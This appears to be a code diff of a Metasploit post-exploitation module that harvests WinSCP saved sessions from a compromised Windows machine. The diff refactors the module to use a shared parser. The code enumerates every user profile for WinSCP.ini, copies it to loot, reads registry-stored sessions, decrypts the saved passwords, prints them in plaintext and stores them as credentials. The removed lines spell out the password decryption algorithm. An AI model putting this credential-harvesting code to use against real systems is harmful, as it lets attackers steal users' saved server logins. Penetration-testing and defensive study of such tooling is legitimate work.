@@ -1,20 +1,18 @@
-# post/windows/gather/enum_vnc_pw.rb
-
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
 require 'rex/parser/ini'
+require 'rex/parser/winscp'
 require 'msf/core/auxiliary/report'
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
   include Msf::Post::Windows::UserProfiles
   include Msf::Post::File
+  include Rex::Parser::WinSCP
 
   def initialize(info={})
     super(update_info(info,
@@ -73,14 +71,21 @@ class Metasploit3 < Msf::Post
             portnum = 22
           end
 
-          winscp_store_config(
-            'FSProtocol' => registry_getvaldata(active_session, 'FSProtocol') || "",
-            'HostName' => registry_getvaldata(active_session, 'HostName') || "",
-            'Password' => password,
-            'PortNumber' => portnum,
-            'UserName' => registry_getvaldata(active_session, 'UserName') || "",
-          )
+          encrypted_password = password
+          user = registry_getvaldata(active_session, 'UserName') || ""
+          fsprotocol = registry_getvaldata(active_session, 'FSProtocol') || ""
+          sname = parse_protocol(fsprotocol)
+          host = registry_getvaldata(active_session, 'HostName') || ""
 
+          plaintext = decrypt_password(encrypted_password, "#{user}#{host}")
+
+          winscp_store_config({
+            hostname: host,
+            username: user,
+            password: plaintext,
+            portnumber: portnum,
+            protocol: sname
+          })
         end
 
         if savedpwds == 0
@@ -96,121 +101,70 @@ class Metasploit3 < Msf::Post
 
   end
 
-
-  def get_ini(filename)
-    print_error("Looking for #{filename}.")
-    # opens the WinSCP.ini file for reading and loads it into the MSF Ini Parser
-    parse = read_file(filename)
-    if parse.nil?
-      print_error("WinSCP.ini file NOT found...")
-      return
-    end
-
-    print_status("Found WinSCP.ini file...")
-    ini = Rex::Parser::Ini.from_s(parse)
-
-    # if a Master Password is in use we give up
-    if ini['Configuration\\Security']['MasterPassword'] == '1'
-      print_status("Master Password Set, unable to recover saved passwords!")
-      return nil
-    end
-
-    # Runs through each group in the ini file looking for all of the Sessions
-    ini.each_key do |group|
-      if group.include?('Sessions') && ini[group].has_key?('Password')
-        winscp_store_config(
-          'FSProtocol' => ini[group]['FSProtocol'],
-          'HostName' => ini[group]['HostName'],
-          'Password' => ini[group]['Password'],
-          'PortNumber' => ini[group]['PortNumber'] || 22,
-          'UserName' => ini[group]['UserName'],
-        )
-
-      end
-    end
-  end
-
-  def decrypt_next_char
-
-    pwalg_simple_magic = 0xA3
-    pwalg_simple_string = "0123456789ABCDEF"
-
-    # Decrypts the next character in the password sequence
-    if @password.length > 0
-      # Takes the first char from the encrypted password and finds its position in the
-      # pre-defined string, then left shifts the returned index by 4 bits
-      unpack1 = pwalg_simple_string.index(@password[0,1])
-      unpack1 = unpack1 << 4
-
-      # Takes the second char from the encrypted password and finds its position in the
-      # pre-defined string
-      unpack2 = pwalg_simple_string.index(@password[1,1])
-      # Adds the two results, XORs against 0xA3, NOTs it and then ands it with 0xFF
-      result= ~((unpack1+unpack2) ^ pwalg_simple_magic) & 0xff
-      # Strips the first two chars off and returns our result
-      @password = @password[2,@password.length]
-      return result
-    end
-
-  end
-
-
-
-  def decrypt_password(pwd, key)
-    pwalg_simple_flag = 0xFF
-    @password = pwd
-    flag = decrypt_next_char()
-
-    if flag == pwalg_simple_flag
-      decrypt_next_char()
-      length = decrypt_next_char()
-    else
-      length = flag
-    end
-    ldel = (decrypt_next_char())*2
-    @password = @password[ldel,@password.length]
-
-    result = ""
-    length.times do
-      result << decrypt_next_char().chr
-    end
-
-    if flag == pwalg_simple_flag
-      result = result[key.length, result.length]
-    end
-
-    result
-  end
-
   def run
     print_status("Looking for WinSCP.ini file storage...")
-    get_ini(expand_path("%PROGRAMFILES%\\WinSCP\\WinSCP.ini"))
-    print_status("Looking for Registry Storage...")
-    get_reg()
-    print_status("Done!")
+
+    # WinSCP is only x86...
+    if sysinfo['Architecture'] == 'x86'
+      prog_files_env = 'ProgramFiles'
+    else
+      prog_files_env = 'ProgramFiles(x86)'
+    end
+    env = get_envs('APPDATA', prog_files_env, 'USERNAME')
+
+    if env['APPDATA'].nil?
+      fail_with(Failure::Unknown, 'Target does not have environment variable APPDATA')
+    elsif env[prog_files_env].nil?
+      fail_with(Failure::Unknown, "Target does not have environment variable #{prog_files_env}")
+    elsif env['USERNAME'].nil?
+      fail_with(Failure::Unknown, 'Target does not have environment variable USERNAME')
+    end
+
+    user_dir = "#{env['APPDATA']}\\..\\.."
+    user_dir << "\\.." if user_dir.include?('Users')
+
+    users = dir(user_dir)
+    users.each do |user|
+      next if user == "." || user == ".."
+      app_data = "#{env['APPDATA'].gsub(env['USERNAME'], user)}\\WinSCP.ini"
+      vprint_status("Looking for #{app_data}...")
+      get_ini(app_data) if file?(app_data)
+    end
+
+    program_files = "#{env[prog_files_env]}\\WinSCP\\WinSCP.ini"
+
+    get_ini(program_files) if file?(program_files)
+
+    print_status("Looking for Registry storage...")
+    get_reg
+  end
+
+  def get_ini(file_path)
+    print_good("WinSCP.ini located at #{file_path}")
+    file = read_file(file_path)
+    stored_path = store_loot('winscp.ini', 'text/plain', session, file, 'WinSCP.ini', file_path)
+    print_good("WinSCP saved to loot: #{stored_path}")
+    parse_ini(file).each do |res|
+      winscp_store_config(res)
+    end
   end
 
   def winscp_store_config(config)
-    host = config['HostName']
-    pass = config['Password']
-    portnum = config['PortNumber']
-    proto = config['FSProtocol']
-    user = config['UserName']
+    begin
+      res = client.net.resolve.resolve_host(config[:hostname], AF_INET)
+      ip = res[:ip] if res
+    rescue Rex::Post::Meterpreter::RequestError => e
+      print_error("Unable to store following credentials in database as we are unable to resolve the IP address: #{e}")
+    ensure
+      print_good("Host: #{config[:hostname]}, IP: #{ip}, Port: #{config[:portnumber]}, Service: #{config[:protocol]}, Username: #{config[:username]}, Password: #{config[:password]}")
+    end
 
-    sname = case proto.to_i
-            when 5 then "FTP"
-            when 0 then "SSH"
-            end
-
-    # Decrypt our password, and report on results
-    plaintext = decrypt_password(pass, user+host)
-    print_status("Host: #{host}  Port: #{portnum} Protocol: #{sname}  Username: #{user}  Password: #{plaintext}")
+    return unless ip
 
     service_data = {
-      # XXX This resolution should happen on the victim side instead
-      address: ::Rex::Socket.getaddress(host),
-      port: portnum,
-      service_name: sname,
+      address: ip,
+      port: config[:portnumber],
+      service_name: config[:protocol],
       protocol: 'tcp',
       workspace_id: myworkspace_id,
     }
@@ -220,8 +174,8 @@ class Metasploit3 < Msf::Post
       session_id: session_db_id,
       post_reference_name: self.refname,
       private_type: :password,
-      private_data: plaintext,
-      username: user
+      private_data: config[:password],
+      username: config[:username]
     }.merge(service_data)
 
     credential_core = create_credential(credential_data)
@@ -233,5 +187,4 @@ class Metasploit3 < Msf::Post
 
     create_credential_login(login_data)
   end
-
 end
